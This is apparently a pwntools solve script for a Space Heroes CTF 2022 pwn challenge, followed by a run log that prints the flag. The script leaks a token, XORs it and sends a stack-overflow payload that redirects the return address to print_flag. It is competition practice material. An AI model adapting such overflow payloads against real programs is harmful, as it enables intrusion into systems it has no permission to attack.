from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './satisfy'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "0.cloud.chals.io"
  PORT = 34720
  s = remote(HOST, PORT)
  return_offset = 0x110
else:
  s = process(BINARY)
  return_offset = 0x100

s.recvuntil("random token ")
token = int(s.recvuntil("\n")[:-1])
print "token =", token, hex(token)

#s.recvuntil("your response ")

buf = "A"*16+"\x00"*8+p32(token^0x7a69)+"\x00"*12+p64(elf.sym.print_flag)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Space_Heroes_CTF_2022/Pwn_SATisfied$ python solve.py r
[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_SATisfied/satisfy'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 0.cloud.chals.io on port 34720: Done
token = 1784270752 0x6a59cfa0
[*] Switching to interactive mode
What is your response >>> 

<<< Flag: shctf{Whos-Th3-k1ng-of-Ur-Sat3ll1te-Castl3}
'''
